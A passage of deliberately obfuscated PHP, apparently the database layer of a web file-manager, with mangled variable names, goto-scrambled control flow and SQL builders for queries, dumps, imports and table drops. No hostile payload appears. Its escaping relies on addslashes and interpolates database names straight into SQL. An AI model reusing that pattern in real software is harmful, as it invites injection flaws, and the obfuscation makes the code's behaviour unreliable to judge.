$_SERVER[¼€¼ˆ¦‚¡]; return !empty($CÑîİ…î†´) ? $bÜ—„™ô§ù[946] . $CÑîİ…î†´ : $bÜ—„™ô§ù[33]; } protected function parseComment($AÀÈäÁÍø) { $Cˆ´‰äŠØâ =& $_SERVER[¼€¼ˆ¦‚¡]; return !empty($AÀÈäÁÍø) ? $Cˆ´‰äŠØâ[947] . $AÀÈäÁÍø . $Cˆ´‰äŠØâ[948] : $Cˆ´‰äŠØâ[33]; } protected function parseDistinct($FÈ©Ã‚…±) { $fÔäÎå é =& $_SERVER[¼€¼ˆ¦‚¡]; return !empty($FÈ©Ã‚…±) ? $fÔäÎå é[949] : $fÔäÎå é[33]; } protected function parseUnion($Cª´ˆø— •) { $Fµ±£èÙø =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($Cª´ˆø— •)) { return $Fµ±£èÙø[33]; } if (isset($Cª´ˆø— •[$Fµ±£èÙø[336]])) { $B¬¨ÕÊ„ä = $Fµ±£èÙø[950]; unset($Cª´ˆø— •[$Fµ±£èÙø[336]]); } else { $B¬¨ÕÊ„ä = $Fµ±£èÙø[951]; } foreach ($Cª´ˆø— • as $E˜™òÛİ¢÷) { $f¼Šô©Øéö[] = $B¬¨ÕÊ„ä . (is_array($E˜™òÛİ¢÷) ? $this->buildSelectSql($E˜™òÛİ¢÷) : $E˜™òÛİ¢÷); } return implode($Fµ±£èÙø[50], $f¼Šô©Øéö); } public function insert($EÒª Ø‘², $bÌ»“öÊ†¨ = array(), $CÛê†·Ì»™ = false) { goto A÷ŞÑ¢Â²—; bà¢¿Ò¸…: $B…É˜µª…ƒ .= $this->parseComment(!empty($bÌ»“öÊ†¨[$C×…±Í‹Û¢[341]]) ? $bÌ»“öÊ†¨[$C×…±Í‹Û¢[341]] : $C×…±Í‹Û¢[33]); return $this->execute($B…É˜µª…ƒ, $this->parseBind(!empty($bÌ»“öÊ†¨[$C×…±Í‹Û¢[273]]) ? $bÌ»“öÊ†¨[$C×…±Í‹Û¢[273]] : array())); goto e±«šÛ¯ó; A÷ŞÑ¢Â²—: $C×…±Í‹Û¢ =& $_SERVER[¼€¼ˆ¦‚¡]; $a«¤·§Ä± = $B‚ßô¿âù’ = array(); $this->model = $bÌ»“öÊ†¨[$C×…±Í‹Û¢[269]]; goto eËî´¡æ¡Ğ; eËî´¡æ¡Ğ: foreach ($EÒª Ø‘² as $C†Èšª‡©Ö => $DËà¹‚¹©Õ) { if (is_array($DËà¹‚¹©Õ) && $C×…±Í‹Û¢[285] == $DËà¹‚¹©Õ[0]) { $B‚ßô¿âù’[] = $this->parseKey($C†Èšª‡©Ö); $a«¤·§Ä±[] = $DËà¹‚¹©Õ[1]; } elseif (is_scalar($DËà¹‚¹©Õ) || is_null($DËà¹‚¹©Õ)) { $B‚ßô¿âù’[] = $this->parseKey($C†Èšª‡©Ö); $a«¤·§Ä±[] = $this->parseValue($DËà¹‚¹©Õ); } } $B…É˜µª…ƒ = ($CÛê†·Ì»™ ? $C×…±Í‹Û¢[818] : $C×…±Í‹Û¢[819]) . $C×…±Í‹Û¢[820] . $this->parseTable($bÌ»“öÊ†¨[$C×…±Í‹Û¢[267]]) . $C×…±Í‹Û¢[814] . implode($C×…±Í‹Û¢[47], $B‚ßô¿âù’) . $C×…±Í‹Û¢[815] . implode($C×…±Í‹Û¢[47], $a«¤·§Ä±) . $C×…±Í‹Û¢[816]; $B…É˜µª…ƒ .= $this->parseLock(isset($bÌ»“öÊ†¨[$C×…±Í‹Û¢[768]]) ? $bÌ»“öÊ†¨[$C×…±Í‹Û¢[768]] : !1); goto bà¢¿Ò¸…; e±«šÛ¯ó: } public function selectInsert($aÀ‘‡×, $Cá”á°‰À, $F»Êèœìø‰ = array()) { goto bÉ‘“åœÖĞ; bÜ´§Üê«Ê: array_walk($aÀ‘‡×, array($this, $e¤ÃË±šƒ[817])); $báªÀŒ Ê© = $e¤ÃË±šƒ[952] . $this->parseTable($Cá”á°‰À) . $e¤ÃË±šƒ[814] . implode($e¤ÃË±šƒ[47], $aÀ‘‡×) . $e¤ÃË±šƒ[931]; $báªÀŒ Ê© .= $this->buildSelectSql($F»Êèœìø‰); goto dæÕ…ÃÀ; bÉ‘“åœÖĞ: $e¤ÃË±šƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->model = $F»Êèœìø‰[$e¤ÃË±šƒ[269]]; if (is_string($aÀ‘‡×)) { $aÀ‘‡× = explode($e¤ÃË±šƒ[47], $aÀ‘‡×); } goto bÜ´§Üê«Ê; dæÕ…ÃÀ: return $this->execute($báªÀŒ Ê©, $this->parseBind(!empty($F»Êèœìø‰[$e¤ÃË±šƒ[273]]) ? $F»Êèœìø‰[$e¤ÃË±šƒ[273]] : array())); goto BœåæÕÜ—÷; BœåæÕÜ—÷: } public function update($F˜š¾¥ä‚ô, $d “—œ×†…) { $c…ù¥¹ÎÄÍ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->model = $d “—œ×†…[$c…ù¥¹ÎÄÍ[269]]; $D÷ë¡Ò¨Ô = $c…ù¥¹ÎÄÍ[953] . $this->parseTable($d “—œ×†…[$c…ù¥¹ÎÄÍ[267]]) . $this->parseSet($F˜š¾¥ä‚ô) . $this->parseWhere(!empty($d “—œ×†…[$c…ù¥¹ÎÄÍ[263]]) ? $d “—œ×†…[$c…ù¥¹ÎÄÍ[263]] : $c…ù¥¹ÎÄÍ[33]) . $this->parseOrder(!empty($d “—œ×†…[$c…ù¥¹ÎÄÍ[350]]) ? $d “—œ×†…[$c…ù¥¹ÎÄÍ[350]] : $c…ù¥¹ÎÄÍ[33]) . $this->parseLimit(!empty($d “—œ×†…[$c…ù¥¹ÎÄÍ[280]]) ? $d “—œ×†…[$c…ù¥¹ÎÄÍ[280]] : $c…ù¥¹ÎÄÍ[33]) . $this->parseLock(isset($d “—œ×†…[$c…ù¥¹ÎÄÍ[768]]) ? $d “—œ×†…[$c…ù¥¹ÎÄÍ[768]] : !1) . $this->parseComment(!empty($d “—œ×†…[$c…ù¥¹ÎÄÍ[341]]) ? $d “—œ×†…[$c…ù¥¹ÎÄÍ[341]] : $c…ù¥¹ÎÄÍ[33]); return $this->execute($D÷ë¡Ò¨Ô, $this->parseBind(!empty($d “—œ×†…[$c…ù¥¹ÎÄÍ[273]]) ? $d “—œ×†…[$c…ù¥¹ÎÄÍ[273]] : array())); } public function delete($F‹ß„ãòŠ = array()) { $A³±ä…õ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->model = $F‹ß„ãòŠ[$A³±ä…õ[269]]; $Bõê§‡¾ = $A³±ä…õ[954] . $this->parseTable($F‹ß„ãòŠ[$A³±ä…õ[267]]) . $this->parseWhere(!empty($F‹ß„ãòŠ[$A³±ä…õ[263]]) ? $F‹ß„ãòŠ[$A³±ä…õ[263]] : $A³±ä…õ[33]) . $this->parseOrder(!empty($F‹ß„ãòŠ[$A³±ä…õ[350]]) ? $F‹ß„ãòŠ[$A³±ä…õ[350]] : $A³±ä…õ[33]) . $this->parseLimit(!empty($F‹ß„ãòŠ[$A³±ä…õ[280]]) ? $F‹ß„ãòŠ[$A³±ä…õ[280]] : $A³±ä…õ[33]) . $this->parseLock(isset($F‹ß„ãòŠ[$A³±ä…õ[768]]) ? $F‹ß„ãòŠ[$A³±ä…õ[768]] : !1) . $this->parseComment(!empty($F‹ß„ãòŠ[$A³±ä…õ[341]]) ? $F‹ß„ãòŠ[$A³±ä…õ[341]] : $A³±ä…õ[33]); return $this->execute($Bõê§‡¾, $this->parseBind(!empty($F‹ß„ãòŠ[$A³±ä…õ[273]]) ? $F‹ß„ãòŠ[$A³±ä…õ[273]] : array())); } public function select($eãÑ¶Øã = array()) { goto c”Õø‹ƒİ¿; c”Õø‹ƒİ¿: $B®ñà±Œí‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->model = $eãÑ¶Øã[$B®ñà±Œí‚[269]]; $f‡Œ§ğÇ‰É = $this->buildSelectSql($eãÑ¶Øã); goto BîÚµ¾œê÷; däùÉ´Ÿó: if ($dÓà—éùàÙ && !1 !== $FŞëõùËæ¦) { think_cache($Fˆ£ç¦ô¦Ğ, $FŞëõùËæ¦, $dÓà—éùàÙ); } return $FŞëõùËæ¦; goto fèÒùìÜŠ½; BîÚµ¾œê÷: $dÓà—éùàÙ = isset($eãÑ¶Øã[$B®ñà±Œí‚[337]]) ? $eãÑ¶Øã[$B®ñà±Œí‚[337]] : !1; if ($dÓà—éùàÙ) { $Fˆ£ç¦ô¦Ğ = is_string($dÓà—éùàÙ[$B®ñà±Œí‚[89]]) ? $dÓà—éùàÙ[$B®ñà±Œí‚[89]] : $B®ñà±Œí‚[955] . md5($f‡Œ§ğÇ‰É); $f‚—†¨´ = think_cache($Fˆ£ç¦ô¦Ğ, $B®ñà±Œí‚[33], $dÓà—éùàÙ); if (!1 !== $f‚—†¨´) { return $f‚—†¨´; } } $FŞëõùËæ¦ = $this->query($f‡Œ§ğÇ‰É, $this->parseBind(!empty($eãÑ¶Øã[$B®ñà±Œí‚[273]]) ? $eãÑ¶Øã[$B®ñà±Œí‚[273]] : array())); goto däùÉ´Ÿó; fèÒùìÜŠ½: } public function buildSelectSql($A—¢êÈ†ë = array()) { goto D¶ªè‰ñ©…; Eæ‡©èÍí: return $D‹ê²é‡‹“; goto fº‘‡›°ùÄ; D¶ªè‰ñ©…: $E‘„‰ÈË„õ =& $_SERVER[¼€¼ˆ¦‚¡]; if (isset($A—¢êÈ†ë[$E‘„‰ÈË„õ[340]])) { if (strpos($A—¢êÈ†ë[$E‘„‰ÈË„õ[340]], $E‘„‰ÈË„õ[47])) { list($b·ªê‹Ò š, $C°æÊ•‚éº) = explode($E‘„‰ÈË„õ[47], $A—¢êÈ†ë[$E‘„‰ÈË„õ[340]]); } else { $b·ªê‹Ò š = $A—¢êÈ†ë[$E‘„‰ÈË„õ[340]]; } $b·ªê‹Ò š = $b·ªê‹Ò š ? $b·ªê‹Ò š : 1; $C°æÊ•‚éº = isset($C°æÊ•‚éº) ? $C°æÊ•‚éº : (is_numeric($A—¢êÈ†ë[$E‘„‰ÈË„õ[280]]) ? $A—¢êÈ†ë[$E‘„‰ÈË„õ[280]] : 20); $Eƒ‡Ğ¶¿³ö = $C°æÊ•‚éº * ((int) $b·ªê‹Ò š - 1); $A—¢êÈ†ë[$E‘„‰ÈË„õ[280]] = $Eƒ‡Ğ¶¿³ö . $E‘„‰ÈË„õ[47] . $C°æÊ•‚éº; } if (think_config($E‘„‰ÈË„õ[956])) { $bëÕõøÑ¡ñ = $E‘„‰ÈË„õ[957] . md5(serialize($A—¢êÈ†ë)); $aÃ¿ù¸Ô·æ = think_cache($bëÕõøÑ¡ñ); if ($aÃ¿ù¸Ô·æ) { return $aÃ¿ù¸Ô·æ; } } goto f§ÅæÀîö°; f§ÅæÀîö°: $D‹ê²é‡‹“ = $this->parseSql($this->selectSql, $A—¢êÈ†ë); $D‹ê²é‡‹“ .= $this->parseLock(isset($A—¢êÈ†ë[$E‘„‰ÈË„õ[768]]) ? $A—¢êÈ†ë[$E‘„‰ÈË„õ[768]] : !1); if (isset($bëÕõøÑ¡ñ)) { think_cache($bëÕõøÑ¡ñ, $D‹ê²é‡‹“); } goto Eæ‡©èÍí; fº‘‡›°ùÄ: } public function parseSql($F‚Úö‹Ï¡, $Eìƒ¢”Ÿñ§ = array()) { $e¸‹‰Ö =& $_SERVER[¼€¼ˆ¦‚¡]; $F‚Úö‹Ï¡ = str_replace(array($e¸‹‰Ö[958], $e¸‹‰Ö[959], $e¸‹‰Ö[960], $e¸‹‰Ö[961], $e¸‹‰Ö[962], $e¸‹‰Ö[963], $e¸‹‰Ö[964], $e¸‹‰Ö[965], $e¸‹‰Ö[966], $e¸‹‰Ö[967], $e¸‹‰Ö[968]), array($this->parseTable("{$Eìƒ¢”Ÿñ§[$e¸‹‰Ö[267]]}"), $this->parseDistinct(isset($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[969]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[969]] : !1), $this->parseField(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[261]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[261]] : $e¸‹‰Ö[176]), $this->parseJoin(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[270]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[270]] : $e¸‹‰Ö[33]), $this->parseWhere(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[263]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[263]] : $e¸‹‰Ö[33]), $this->parseGroup(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[970]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[970]] : $e¸‹‰Ö[33]), $this->parseHaving(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[971]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[971]] : $e¸‹‰Ö[33]), $this->parseOrder(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[350]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[350]] : $e¸‹‰Ö[33]), $this->parseLimit(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[280]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[280]] : $e¸‹‰Ö[33]), $this->parseUnion(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[335]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[335]] : $e¸‹‰Ö[33]), $this->parseComment(!empty($Eìƒ¢”Ÿñ§[$e¸‹‰Ö[341]]) ? $Eìƒ¢”Ÿñ§[$e¸‹‰Ö[341]] : $e¸‹‰Ö[33])), $F‚Úö‹Ï¡); return $F‚Úö‹Ï¡; } public function getLastSql($fóÓ’ó¸æ = '') { return $fóÓ’ó¸æ ? $this->modelSql[$fóÓ’ó¸æ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($cˆ‰è¿ŒÎÚ) { return addslashes($cˆ‰è¿ŒÎÚ); } public function setModel($bÁñã„öâ) { $this->model = $bÁñã„öâ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($B»ğÌø’…, $bäë¨Ë¢…» = '') { $this->database = $B»ğÌø’…; $this->type = $bäë¨Ë¢…»; } public function model($dÆŒöµ¤§— = '') { return new ModelBase($dÆŒöµ¤§—, $_SERVER[¼€¼ˆ¦‚¡][33], $this->database); } public function db($aŸò«¨³± = false) { goto c†áÒâ—µÎ; Eˆ¼¿Ç„‰Ú: $d×ÇÖ„† = $fŠ»¿ä¶Ÿ»[$A½”óµÔ§[884]]; $fŠ»¿ä¶Ÿ»[$A½”óµÔ§[884]] = $A½”óµÔ§[33]; if ($fŠ»¿ä¶Ÿ»[$A½”óµÔ§[719]] == $A½”óµÔ§[720]) { $d˜–¯»ùõß = $fŠ»¿ä¶Ÿ»[$A½”óµÔ§[721]]; $fŠ»¿ä¶Ÿ»[$A½”óµÔ§[721]] = substr($d˜–¯»ùõß, 0, strrpos($d˜–¯»ùõß, $A½”óµÔ§[972])); } goto D‰¾±ïÂ±; dÂÙÈÏÚÍ”: $this->database = $fŠ»¿ä¶Ÿ»; $b£Ö¸âí–->execute("\165\163\145\40\140{$d×ÇÖ„†}\140"); return $b£Ö¸âí–; goto c‘À®²±ëÛ; e’öÀ˜„ï: if (!$càŠˆ‰Ø„) { $b£Ö¸âí–->execute("\x63\162\x65\141\x74\145\x20\144\x61\x74\x61\142\141\x73\145\40\140{$d×ÇÖ„†}\140"); } $fŠ»¿ä¶Ÿ»[$A½”óµÔ§[884]] = $d×ÇÖ„†; if ($fŠ»¿ä¶Ÿ»[$A½”óµÔ§[719]] == $A½”óµÔ§[720]) { $fŠ»¿ä¶Ÿ»[$A½”óµÔ§[721]] .= $A½”óµÔ§[972] . $d×ÇÖ„†; } goto dÂÙÈÏÚÍ”; c†áÒâ—µÎ: $A½”óµÔ§ =& $_SERVER[¼€¼ˆ¦‚¡]; $fŠ»¿ä¶Ÿ» = array_change_key_case($this->database); if ($this->type == $A½”óµÔ§[9] || !$aŸò«¨³±) { return $this->model()->db(); } goto Eˆ¼¿Ç„‰Ú; D‰¾±ïÂ±: $this->database = $fŠ»¿ä¶Ÿ»; $b£Ö¸âí– = $this->model()->db(); try { $càŠˆ‰Ø„ = $b£Ö¸âí–->execute("\163\150\157\167\x20\x64\141\164\141\x62\x61\163\145\163\x20\154\x69\x6b\145\x20\47{$d×ÇÖ„†}\47"); } catch (Exception $c£Ê­¶­) { } goto e’öÀ˜„ï; c‘À®²±ëÛ: } public function createTable($aŸËó³®ïß, $e Ç‘›ÕÍî = null) { $aÆŠ‚™ê¾½ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!IO::exist($aŸËó³®ïß)) { show_json(LNG($aÆŠ‚™ê¾½[973]), !1); } $AÎ¨Ş”°ˆù = sqlSplit(IO::getContent($aŸËó³®ïß)); foreach ($AÎ¨Ş”°ˆù as $FÄ“Ï»°Œä) { if ($e Ç‘›ÕÍî) { $D‡†Ù¡ß›Ç = stripos($FÄ“Ï»°Œä, $aÆŠ‚™ê¾½[974]) === 0; if ($D‡†Ù¡ß›Ç) { $e Ç‘›ÕÍî->task[$aÆŠ‚™ê¾½[975]] += 1; } } $this->model()->db()->execute($FÄ“Ï»°Œä); if ($e Ç‘›ÕÍî && $D‡†Ù¡ß›Ç) { preg_match($aÆŠ‚™ê¾½[976], $FÄ“Ï»°Œä, $bĞóÚ§Í‰˜); $e Ç‘›ÕÍî->task[$aÆŠ‚™ê¾½[977]] = $bĞóÚ§Í‰˜[1]; $e Ç‘›ÕÍî->update(1); } } $this->taskToCache($e Ç‘›ÕÍî); } public function insertTable($aÒ“åîğİÀ, $bàÍ»·§ÓÑ = null) { $e‘¨å©ëàÑ =& $_SERVER[¼€¼ˆ¦‚¡]; $d½½ƒ­ÍÎñ = $this->model()->db(); $B‹ØÛæ”õ‚ = $b„ö–„¹ˆ‘ ? array($b„ö–„¹ˆ‘) : $d½½ƒ­ÍÎñ->getTables(); foreach ($aÒ“åîğİÀ as $cƒ¯óôÌ¸ñ) { $b„ö–„¹ˆ‘ = basename($cƒ¯óôÌ¸ñ, $e‘¨å©ëàÑ[714]); if (!in_array($b„ö–„¹ˆ‘, $B‹ØÛæ”õ‚)) { continue; } if ($bàÍ»·§ÓÑ) { $bàÍ»·§ÓÑ->task[$e‘¨å©ëàÑ[977]] = $b„ö–„¹ˆ‘; } if (get_filesize($cƒ¯óôÌ¸ñ) == 0) { continue; } $a›²Êé–Ÿ = $this->sqlToDb($cƒ¯óôÌ¸ñ, $bàÍ»·§ÓÑ); if (!$a›²Êé–Ÿ) { show_json(LNG($e‘¨å©ëàÑ[978]) . "\x5b{$b„ö–„¹ˆ‘}\135", !1); } } $this->taskToCache($bàÍ»·§ÓÑ); } public function sqlFromDb($C˜¿÷­Ñ¬º, $d‹ğì ³ÙŞ, $eßÙÚŒ‘Ëö = null, $D˜…ùÀäÕŞ = null) { goto aß¨¢İÀ°è; FÆÖ‹Ó³«: $aßß÷î„ë¯ = 1; $Bë“Öò¹Çç = 500; $a†‰İ—ê° = fopen($d‹ğì ³ÙŞ, $_SERVER[¼€¼ˆ¦‚¡][979]); goto DÖø–é¹Ï™; A‚ñÍíœå: fclose($a†‰İ—ê°); return $FÉë“„§¤ä; goto A“¼›“Š‘ä; aß¨¢İÀ°è: if ($eßÙÚŒ‘Ëö) { $eßÙÚŒ‘Ëö->task[$_SERVER[¼€¼ˆ¦‚¡][977]] = $C˜¿÷­Ñ¬º; } $E×ÎÍÂñ¨ = $this->model($C˜¿÷­Ñ¬º); $FÉë“„§¤ä = 0; goto FÆÖ‹Ó³«; DÖø–é¹Ï™: $bæï…©Öââ = $E×ÎÍÂñ¨->getPk(); $aÈø·ññ…º = $E×ÎÍÂñ¨->getDbFields(); do { $e§Ø³‹ˆ´İ = $E×ÎÍÂñ¨->field($aÈø·ññ…º)->order($bæï…©Öââ . $_SERVER[¼€¼ˆ¦‚¡][980])->selectPage($Bë“Öò¹Çç, $aßß÷î„ë¯); $b©Š±¥É = isset($e§Ø³‹ˆ´İ[$_SERVER[¼€¼ˆ¦‚¡][351]][$_SERVER[¼€¼ˆ¦‚¡][353]]) ? $e§Ø³‹ˆ´İ[$_SERVER[¼€¼ˆ¦‚¡][351]][$_SERVER[¼€¼ˆ¦‚¡][353]] : 0; $Dä ‚–†ñ‹ = !empty($e§Ø³‹ˆ´İ[$_SERVER[¼€¼ˆ¦‚¡][354]]) ? $e§Ø³‹ˆ´İ[$_SERVER[¼€¼ˆ¦‚¡][354]] : array(); if (!($Aášæ³’à = count($Dä ‚–†ñ‹))) { break; } $F·Œñ‚ã†Ó = array(); foreach ($Dä ‚–†ñ‹ as $FÜ‡Ò¥óÔß) { if ($C˜¿÷­Ñ¬º == $_SERVER[¼€¼ˆ¦‚¡][981] && $FÜ‡Ò¥óÔß[$_SERVER[¼€¼ˆ¦‚¡][29]] == $_SERVER[¼€¼ˆ¦‚¡][982]) { $dÊ¤¯ç¢é = json_decode($FÜ‡Ò¥óÔß[$_SERVER[¼€¼ˆ¦‚¡][359]], !0); if ($dÊ¤¯ç¢é[$_SERVER[¼€¼ˆ¦‚¡][28]] == date($_SERVER[¼€¼ˆ¦‚¡][686]) && !$dÊ¤¯ç¢é[$_SERVER[¼€¼ˆ¦‚¡][685]]) { continue; } } if ($D˜…ùÀäÕŞ) { $FÜ‡Ò¥óÔß[$_SERVER[¼€¼ˆ¦‚¡][75]] = "\x7b\151\157\x3a{$D˜…ùÀäÕŞ}\x7d" . substr($FÜ‡Ò¥óÔß[$_SERVER[¼€¼ˆ¦‚¡][75]], strlen("\x7b\x69\157\72{$FÜ‡Ò¥óÔß[$_SERVER[¼€¼ˆ¦‚¡][740]]}\x7d")); $FÜ‡Ò¥óÔß[$_SERVER[¼€¼ˆ¦‚¡][740]] = $D˜…ùÀäÕŞ; } $F·Œñ‚ã†Ó[] = $_SERVER[¼€¼ˆ¦‚¡][983] . $this->sqlEncode($FÜ‡Ò¥óÔß) . $_SERVER[¼€¼ˆ¦‚¡][984]; } $cô­½“İ = "\111\x4e\123\x45\122\124\x20\x49\116\x54\117\x20\x60{$C˜¿÷­Ñ¬º}\x60\x20\x28\x60" . implode($_SERVER[¼€¼ˆ¦‚¡][985], $aÈø·ññ…º) . $_SERVER[¼€¼ˆ¦‚¡][986]; fwrite($a†‰İ—ê°, $cô­½“İ . implode($_SERVER[¼€¼ˆ¦‚¡][987], $F·Œñ‚ã†Ó) . $_SERVER[¼€¼ˆ¦‚¡][67] . PHP_EOL); $aßß÷î„ë¯++; $FÉë“„§¤ä += $Aášæ³’à; if ($eßÙÚŒ‘Ëö) { $eßÙÚŒ‘Ëö->update($Aášæ³’à); } } while ($aßß÷î„ë¯ <= $b©Š±¥É); goto A‚ñÍíœå; A“¼›“Š‘ä: } public function sqlToDb($cšğÕÉ’ÍÜ, $EÁŸ÷‘é¶Õ = null) { goto e‡˜ë¯Æâ‘; bÖÂ¤Ò© ¡: $A¸’¿£™Úç = 500 + 1; while (!feof($FÉó„Çå…)) { if ($EÁŸ÷‘é¶Õ && $AÓ™”ÙÜ  != 0) { $EÁŸ÷‘é¶Õ->task[$A›¸ÓâÕÒ[975]] += 1; } $AÓ™”ÙÜ ++; $c¨‡ßŞ™ºÌ = trim(fgets($FÉó„Çå…)); $eÌäÚäùŒÏ .= $A›¸ÓâÕÒ[50] . $this->sqlDecode($c¨‡ßŞ™ºÌ, $this->type); if ($AÓ™”ÙÜ  == $A¸’¿£™Úç) { $eÌäÚäùŒÏ = rtrim(trim($eÌäÚäùŒÏ), $A›¸ÓâÕÒ[67]); if (!$Døƒ—Ê„ĞÜ->execute($eÌäÚäùŒÏ)) { return !1; } if ($EÁŸ÷‘é¶Õ) { $EÁŸ÷‘é¶Õ->update($AÓ™”ÙÜ  - 1); } $eÌäÚäùŒÏ = $A›¸ÓâÕÒ[33]; $AÓ™”ÙÜ  = 0; } } fclose($FÉó„Çå…); goto C‹¿ä¼âƒ; C‹¿ä¼âƒ: if (trim($eÌäÚäùŒÏ)) { $eÌäÚäùŒÏ = rtrim(trim($eÌäÚäùŒÏ), $A›¸ÓâÕÒ[67]); if (!$Døƒ—Ê„ĞÜ->execute($eÌäÚäùŒÏ)) { return !1; } if ($EÁŸ÷‘é¶Õ) { $EÁŸ÷‘é¶Õ->update($AÓ™”ÙÜ  - 1); } } return !0; goto cİÚ‰à‰Ç½; e‡˜ë¯Æâ‘: $A›¸ÓâÕÒ =& $_SERVER[¼€¼ˆ¦‚¡]; $Døƒ—Ê„ĞÜ = $this->model()->db(); $FÉó„Çå… = @fopen($cšğÕÉ’ÍÜ, $A›¸ÓâÕÒ[988]); goto fˆİ¦šã; fˆİ¦šã: if (!$FÉó„Çå…) { return !1; } $AÓ™”ÙÜ  = 0; $eÌäÚäùŒÏ = $A›¸ÓâÕÒ[33]; goto bÖÂ¤Ò© ¡; cİÚ‰à‰Ç½: } public function dropTable($B—¨Üì¸»“ = null) { $b¨íŸ·‹ËÂ = $this->model()->db(); $B™ÉÄ£´æÚ = $B—¨Üì¸»“ ? array($B—¨Üì¸»“) : $b¨íŸ·‹ËÂ->getTables(); if (!$B™ÉÄ£´æÚ) { return; } foreach ($B™ÉÄ£´æÚ as $B—¨Üì¸»“) { $b¨íŸ·‹ËÂ->execute("\x64\162\157\x70\40\164\141\142\x6c\145\x20\x69\x66\x20\145\x78\151\x73\164\163\x20\140{$B—¨Üì¸»“}\x60"); } } private function taskToCache($e‹ÉëÁÄÉİ = null) { $C× —š½°… =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$e‹ÉëÁÄÉİ) { return; } $B›¶§ŒİòÙ = array($C× —š½°…[977] => $e‹ÉëÁÄÉİ->task[$C× —š½°…[977]], $C× —š½°…[975] => $e‹ÉëÁÄÉİ->task[$C× —š½°…[975]], $C× —š½°…[989] => $e‹ÉëÁÄÉİ->task[$C× —š½°…[989]]); if ($B›¶§ŒİòÙ[$C× —š½°…[975]] == $B›¶§ŒİòÙ[$C× —š½°…[989]]) { $B›¶§ŒİòÙ[$C× —š½°…[692]] = 1; } Cache::set($C× —š½°…[990] . $e‹ÉëÁÄÉİ->task[$C× —š½°…[367]], $B›¶§ŒİòÙ); $e‹ÉëÁÄÉİ->end(); } private function sqlEncode($e÷‘¡½‹’) { $B¥œÅìôœ =& $_SERVER[¼€¼ˆ¦‚¡]; $D­óƒ¡–ô¥ = array(); foreach ($e÷‘¡½‹’ as $B¬…Í®¿Øì) { if (is_array($B¬…Í®¿Øì)) { $B¬…Í®¿Øì = json_encode_force($B¬…Í®¿Øì); } $B¬…Í®¿Øì = addslashes($B¬…Í®¿Øì); $B¬…Í®¿Øì = str_replace(array($B¥œÅìôœ[991], $B¥œÅìôœ[217]), array($B¥œÅìôœ[992], $B¥œÅìôœ[993]), $B¬…Í®¿Øì); $D­óƒ¡–ô¥[] = str_replace($B¥œÅìôœ[55], $B¥œÅìôœ[994], $B¬…Í®¿Øì); } return $B¥œÅìôœ[55] . implode($B¥œÅìôœ[995], $D­óƒ¡–ô¥) . $B¥œÅìôœ[55]; } private function sqlDecode($Bò›¦Ü³áÌ, $b˜—‡«‡„¿) { $aâ‚……ŠÍ£ =& $_SERVER[¼€¼ˆ¦‚¡]; $Bò›¦Ü³áÌ = str_replace(array($aâ‚……ŠÍ£[992], $aâ‚……ŠÍ£[993]), array($aâ‚……ŠÍ£[991], $aâ‚……ŠÍ£[217]), $Bò›¦Ü³áÌ); if ($b˜—‡«‡„¿ == $aâ‚……ŠÍ£[9]) { $Bò›¦Ü³áÌ = stripslashes($Bò›¦Ü³áÌ); } return $Bò›¦Ü³áÌ; } } goto aäåÕÑ Í; C†ùÇÃµ¡ã: class Services_JSON { function __construct($D•Ú¬î‚Í¹ = 0) { $this->use = $D•Ú¬î‚Í¹; } function utf162utf8($BÁ ‚©¨‡›) { $c¿‡’ÍÈó =& $_SERVER[¼€¼ˆ¦‚¡]; if (function_exists($c¿‡’ÍÈó[68])) { return mb_convert_encoding($BÁ ‚©¨‡›, $c¿‡’ÍÈó[1590], $c¿‡’ÍÈó[1939]); } $bÍèé“²“ = ord($BÁ ‚©¨‡›[0]) << 8 | ord($BÁ ‚©¨‡›[1]); switch (!0) { case (127 & $bÍèé“²“) == $bÍèé“²“: return chr(127 & $bÍèé“²“); case (2047 & $bÍèé“²“) == $bÍèé“²“: return chr(192 | $bÍèé“²“ >> 6 & 31) . chr(128 | $bÍèé“²“ & 63); case (65535 & $bÍèé“²“) == $bÍèé“²“: return chr(224 | $bÍèé“²“ >> 12 & 15) . chr(128 | $bÍèé“²“ >> 6 & 63) . chr(128 | $bÍèé“²“ & 63); } return $c¿‡’ÍÈó[33]; } function utf82utf16($A‘ÉÁ‡‡ÌÜ) { $DÀë“Âº =& $_SERVER[¼€¼ˆ¦‚¡]; if (function_exists($DÀë“Âº[68])) { return mb_convert_encoding($A‘ÉÁ‡‡ÌÜ, $DÀë“Âº[1939], $DÀë“Âº[1590]); } switch (strlen($A‘ÉÁ‡‡ÌÜ)) { case 1: return $A‘ÉÁ‡‡ÌÜ; case 2: return chr(7 & ord($A‘ÉÁ‡‡ÌÜ[0]) >> 2) . chr(192 & ord($A‘ÉÁ‡‡ÌÜ[0]) << 6 | 63 & ord($A‘ÉÁ‡‡ÌÜ[1])); case 3: return chr(240 & ord($A‘ÉÁ‡‡ÌÜ[0]) << 4 | 15 & 